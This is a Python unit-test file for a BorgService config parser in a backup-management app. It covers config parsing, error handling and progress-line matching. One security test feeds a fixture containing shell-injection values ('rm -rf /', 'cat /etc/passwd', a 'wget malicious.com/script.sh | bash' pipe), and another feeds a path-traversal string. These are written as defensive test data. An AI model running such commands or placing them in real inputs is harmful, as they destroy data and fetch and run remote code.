"""
Core tests for BorgService - focusing on critical security and functionality
"""

from unittest.mock import Mock, patch, mock_open

from borgitory.services.borg_service import BorgService
from borgitory.models.database import Repository
from borgitory.models.borg_info import BorgRepositoryConfig


def create_test_borg_service(
    job_executor=None,
    command_runner=None,
    job_manager=None,
    volume_service=None,
    archive_service=None,
) -> BorgService:
    """Helper function to create BorgService with all required dependencies for testing."""
    return BorgService(
        job_executor=job_executor or Mock(),
        command_runner=command_runner or Mock(),
        job_manager=job_manager or Mock(),
        volume_service=volume_service or Mock(),
        archive_service=archive_service or Mock(),
    )


class TestBorgServiceCore:
    """Test core BorgService functionality and security."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

        # Create mock repository
        self.mock_repository = Mock(spec=Repository)
        self.mock_repository.id = 1
        self.mock_repository.name = "test-repo"
        self.mock_repository.path = "/path/to/repo"
        self.mock_repository.get_passphrase.return_value = "test_passphrase"
        self.mock_repository.get_keyfile_content.return_value = None

    def test_service_initialization(self) -> None:
        """Test BorgService initializes correctly."""
        service = create_test_borg_service()
        assert hasattr(service, "progress_pattern")
        assert service.progress_pattern is not None

    def test_progress_pattern_matching(self) -> None:
        """Test that progress pattern correctly matches Borg output."""
        # Test valid Borg progress line
        test_line = "1234567 654321 111111 150 /path/to/some/important/file.txt"
        match = self.borg_service.progress_pattern.match(test_line)

        assert match is not None
        assert match.group("original_size") == "1234567"
        assert match.group("compressed_size") == "654321"
        assert match.group("deduplicated_size") == "111111"
        assert match.group("nfiles") == "150"
        assert match.group("path") == "/path/to/some/important/file.txt"

        # Test invalid line doesn't match
        invalid_line = "This is not a progress line"
        assert self.borg_service.progress_pattern.match(invalid_line) is None


class TestBorgConfigParsingSecurity:
    """Test Borg config parsing for security and correctness."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

    def test_parse_config_file_not_found(self) -> None:
        """Test handling when config file doesn't exist."""
        with patch("os.path.exists", return_value=False):
            result = self.borg_service._parse_borg_config("/nonexistent/repo")

            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Config file not found" in result.preview

    def test_parse_config_repokey_encryption(self) -> None:
        """Test parsing repository with embedded key encryption."""
        config_content = """[repository]
id = 1234567890abcdef1234567890abcdef12345678
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
key = this_is_a_very_long_embedded_encryption_key_data_that_indicates_repokey_mode_encryption
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Borg repository detected" in result.preview

    def test_parse_config_keyfile_encryption(self) -> None:
        """Test parsing repository with separate keyfile encryption."""
        config_content = """[repository]
id = 1234567890abcdef1234567890abcdef12345678
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
key = 
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ), patch("os.listdir", return_value=["key.repository_id_12345", "data"]):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Borg repository detected" in result.preview

    def test_parse_config_no_encryption(self) -> None:
        """Test parsing unencrypted repository (rare but possible)."""
        config_content = """[repository]
id = 1234567890abcdef1234567890abcdef12345678
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Borg repository detected" in result.preview

    def test_parse_config_invalid_repository(self) -> None:
        """Test parsing file that's not a valid Borg repository."""
        config_content = """[some_other_section]
not_a_repository = true
invalid_config = yes
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "invalid"
            assert result.requires_keyfile is False
            assert "Not a valid Borg repository" in result.preview

    def test_parse_config_encrypted_with_hints(self) -> None:
        """Test parsing with encryption hints but unclear mode."""
        config_content = """[repository]
id = 1234567890abcdef1234567890abcdef12345678
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
algorithm = AES256-CBC
cipher = encrypted_data_here
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/test/repo")

            assert result.mode == "unknown"
            assert "Borg repository detected" in result.preview

    def test_parse_config_read_permission_error(self) -> None:
        """Test handling of permission denied errors."""
        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", side_effect=PermissionError("Access denied")
        ):
            result = self.borg_service._parse_borg_config("/restricted/repo")

            assert result.mode == "error"
            assert result.requires_keyfile is False
            assert "Error reading config" in result.preview
            assert "Access denied" in result.preview

    def test_parse_config_io_error(self) -> None:
        """Test handling of I/O errors during file reading."""
        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", side_effect=IOError("Disk error")
        ):
            result = self.borg_service._parse_borg_config("/failing/repo")

            assert result.mode == "error"
            assert "Error reading config" in result.preview

    def test_parse_config_malformed_ini(self) -> None:
        """Test handling of malformed configuration files."""
        malformed_content = """[repository
this is malformed ini content
key value without equals sign
[incomplete_section"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=malformed_content)
        ):
            result = self.borg_service._parse_borg_config("/malformed/repo")

            assert result.mode == "error"
            assert "Error reading config" in result.preview

    def test_parse_config_unicode_error(self) -> None:
        """Test handling of unicode decode errors."""
        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open()
        ) as mock_file:
            # Simulate unicode decode error
            mock_file.return_value.read.side_effect = UnicodeDecodeError(
                "utf-8", b"\xff\xfe binary content", 0, 2, "invalid start byte"
            )

            result = self.borg_service._parse_borg_config("/binary/repo")

            assert result.mode == "error"
            assert "Error reading config" in result.preview


class TestBorgServiceSecurityIntegration:
    """Test that BorgService properly integrates security measures."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

    def test_config_parsing_path_validation(self) -> None:
        """Test that config parsing validates repository paths."""
        # Test with malicious path
        malicious_path = "../../../etc/passwd"

        # The method should handle path validation safely
        # (Current implementation doesn't validate input paths, but it should)
        result = self.borg_service._parse_borg_config(malicious_path)

        # Should handle gracefully without exposing system files
        assert isinstance(result, BorgRepositoryConfig)
        assert result.mode in ["error", "unknown"]
        assert result.requires_keyfile in [True, False]
        assert result.preview in [
            "Repository detected",
            "Error reading config: Security error",
            "Config file not found",
        ]

    def test_config_parsing_prevents_code_execution(self) -> None:
        """Test that config parsing doesn't execute arbitrary code."""
        # Test with potentially dangerous config content
        dangerous_content = """[repository]
id = $(rm -rf /)
segments_per_dir = `cat /etc/passwd`
key = ; wget malicious.com/script.sh | bash
"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=dangerous_content)
        ), patch("os.listdir", return_value=[]):
            # Should parse safely without executing anything
            result = self.borg_service._parse_borg_config("/test/repo")

            # Should treat it as a normal config, not execute the content
            assert isinstance(result, BorgRepositoryConfig)
            assert result.mode in ["error", "unknown"]

    def test_keyfile_discovery_security(self) -> None:
        """Test that keyfile discovery doesn't expose sensitive information."""
        config_content = """[repository]
id = 1234567890abcdef1234567890abcdef12345678
key = 
"""

        # Mock directory listing that might contain sensitive files
        mock_files = [
            "key.repository_id_12345",
            ".secret_file",
            "password.txt",
            "keyfile.backup",
            "authorized_keys",
            "id_rsa",
        ]

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=config_content)
        ), patch("os.listdir", return_value=mock_files):
            result = self.borg_service._parse_borg_config("/test/repo")

            # Should only identify as a repository without exposing files
            assert result.mode == "unknown"
            assert result.requires_keyfile is False
            assert "Borg repository detected" in result.preview

    def test_error_messages_dont_leak_info(self) -> None:
        """Test that error messages don't leak sensitive system information."""
        # Test with various error scenarios
        error_scenarios = [
            (FileNotFoundError("No such file or directory"), "file system paths"),
            (PermissionError("Operation not permitted"), "permission details"),
            (OSError("Device or resource busy"), "system resources"),
        ]

        for exception, context in error_scenarios:
            with patch("os.path.exists", return_value=True), patch(
                "builtins.open", side_effect=exception
            ):
                result = self.borg_service._parse_borg_config("/test/repo")

                assert result.mode == "error"
                # Error message should be sanitized and not leak sensitive info
                preview = result.preview.lower()
                assert "error reading config" in preview
                # Should not contain full system paths or detailed error info
                assert "/test/repo" not in preview or "error reading config" in preview


class TestBorgServiceEdgeCases:
    """Test edge cases and boundary conditions."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.borg_service = create_test_borg_service()

    def test_empty_config_file(self) -> None:
        """Test parsing completely empty config file."""
        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data="")
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/empty/repo")

            assert result.mode == "invalid"
            assert "Not a valid Borg repository" in result.preview

    def test_whitespace_only_config(self) -> None:
        """Test parsing config with only whitespace."""
        whitespace_content = "   \n\t\n   \n"

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=whitespace_content)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/whitespace/repo")

            assert result.mode == "invalid"

    def test_config_with_comments_only(self) -> None:
        """Test parsing config with only comments."""
        comment_content = """# This is a comment
; This is also a comment  
# [repository] - this is commented out
; key = commented key"""

        with patch("os.path.exists", return_value=True), patch(
            "builtins.open", mock_open(read_data=comment_content)
        ), patch("os.listdir", return_value=[]):
            result = self.borg_service._parse_borg_config("/comments/repo")

            assert result.mode == "invalid"

    def test_progress_pattern_edge_cases(self) -> None:
        """Test progress pattern with edge cases."""
        # Test minimum valid input
        minimal_line = "0 0 0 0 /"
        match = self.borg_service.progress_pattern.match(minimal_line)
        assert match is not None
        assert match.group("path") == "/"

        # Test with very large numbers
        large_numbers_line = (
            "999999999999 888888888888 777777777777 1000000 /very/long/path/to/file"
        )
        match = self.borg_service.progress_pattern.match(large_numbers_line)
        assert match is not None
        assert match.group("original_size") == "999999999999"

        # Test with spaces in path (should work)
        space_path_line = "100 50 25 5 /path with spaces/file name.txt"
        match = self.borg_service.progress_pattern.match(space_path_line)
        assert match is not None
        assert match.group("path") == "/path with spaces/file name.txt"

        # Test with special characters in path
        special_chars_line = "100 50 25 5 /path/with-special_chars@#$/file.txt"
        match = self.borg_service.progress_pattern.match(special_chars_line)
        assert match is not None
        assert match.group("path") == "/path/with-special_chars@#$/file.txt"
